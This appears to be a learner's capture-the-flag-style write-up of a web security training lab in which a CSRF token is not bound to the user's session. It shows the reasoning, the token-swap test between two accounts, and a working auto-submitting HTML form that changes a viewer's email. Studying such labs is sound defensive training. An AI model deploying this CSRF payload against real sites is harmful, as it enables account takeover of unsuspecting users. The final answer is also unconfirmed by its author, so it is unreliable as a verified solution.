# Lab: CSRF where token is not tied to user session

**End Goal:** Host an HTML page on the exploit server that uses a CSRF attack to change the viewer's email address.

**Logins:** `wiener:peter` and `carlos:montoya`

**Analysis**

- Access lab --> log in as wiener --> go to **My account**
- Open DevTools --> leave **Network** tab open so it records requests
- Type `test@test.com` in the Update email box --> Submit
- Click the `change-email` entry --> **Payload** tab --> Form Data shows `email` and a `csrf` token

*The lab name says the token isn't tied to the session, so I tested that. I opened a private window, logged in as carlos, and started his own email change with DevTools recording. In carlos's request I swapped his csrf value for the token from wiener's request, and it was still accepted — carlos's email changed. So a token minted under one session works under any session. That means I can bake a valid token straight into the exploit and the victim's session will accept it.*

<form action="https://0a3d00eb041285a7807d03f700ef008a.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="hacker@evil-user.net">
  <input type="hidden" name="csrf" value="zz22IUnSfdx98vYbbBAZhYYune0lvge5">
</form>
<script>
  document.forms[0].submit();
</script>

*But my first exploit failed: I'd copied the token out of a request I had already submitted, and these tokens are single-use, so the server had already spent it. I need a fresh, unused one instead.*

- Go to **My account** but don't submit anything
- Right-click the page --> **View page source** (or DevTools --> Elements) --> find the hidden field inside the update-email form:

<input required="" type="hidden" name="csrf" value="mAmiSZalKkvwit46R3m1k5r5td4y5yiU">

**Answer:**

<form action="https://0a3d00eb041285a7807d03f700ef008a.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="hacker@evil-user.net">
  <input type="hidden" name="csrf" value="mAmiSZalKkvwit46R3m1k5r5td4y5yiU">
</form>
<script>
  document.forms[0].submit();
</script>

*This should work but the lab banner of "solved" didn't come so I'm not sure now.*

